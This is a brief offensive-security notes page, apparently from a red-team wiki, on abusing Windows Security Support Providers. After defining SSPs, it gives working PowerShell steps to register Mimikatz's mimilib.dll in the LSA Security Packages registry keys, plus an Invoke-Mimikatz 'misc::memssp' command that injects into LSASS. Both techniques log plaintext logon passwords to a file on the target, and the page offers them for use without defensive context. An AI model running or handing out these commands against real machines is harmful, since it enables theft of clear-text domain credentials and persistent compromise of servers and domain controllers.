# Custom SSP

A Security Support Provider (SSP) is a DLL which provides for an application an authenticated connection. \
\
Microsoft SSPs:&#x20;

* NTLM
* Kerberos
* Wdigest
* CredSSP

## Exploitation&#x20;

Mimikatz can provide a custom SSP (mimilib.dll) which logs local logons, service account, and machine account passwords in clear text on the target server.

Drop the mimilib.dll to system32 and add mimilib to Security Packages:&#x20;

```powershell
$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages'
$packages += "mimilib"

Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
```

Using mimikatz, inject into LSASS (not stable but usable)

```powershell
Invoke-Mimikatz -Command '"misc::memssp"'
```

{% hint style="info" %}
All local logons on the DC are logged to C:\Windows\system32\mimilsa.log
{% endhint %}

